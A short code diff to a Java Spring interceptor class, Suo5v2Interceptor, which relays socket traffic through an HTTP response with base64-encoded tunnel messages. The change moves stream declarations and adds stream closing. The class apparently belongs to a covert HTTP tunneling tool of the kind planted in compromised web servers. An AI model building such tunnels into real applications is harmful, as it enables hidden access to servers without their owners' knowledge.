@@ -341,10 +341,10 @@ public class Suo5v2Interceptor implements AsyncHandlerInterceptor, Runnable, Hos
 
         Thread t = null;
         boolean sendClose = true;
+        final OutputStream scOutStream = socket.getOutputStream();
+        final InputStream scInStream = socket.getInputStream();
+        final OutputStream respOutputStream = resp.getOutputStream();
         try {
-            final OutputStream scOutStream = socket.getOutputStream();
-            final InputStream scInStream = socket.getInputStream();
-            final OutputStream respOutputStream = resp.getOutputStream();
 
             Suo5v2Interceptor p = new Suo5v2Interceptor(scInStream, respOutputStream, tunId);
             t = new Thread(p);
@@ -376,19 +376,20 @@ public class Suo5v2Interceptor implements AsyncHandlerInterceptor, Runnable, Hos
             }
         } catch (Exception ignored) {
         } finally {
-
             try {
                 socket.close();
             } catch (Exception ignored) {
             }
-
             if (sendClose) {
                 writeAndFlush(resp, marshalBase64(newDel(tunId)), 0);
+            }
+            try {
+                respOutputStream.close();
+            } catch (Exception ignored) {
             }
             if (t != null) {
                 t.join();
             }
-
         }
     }
 
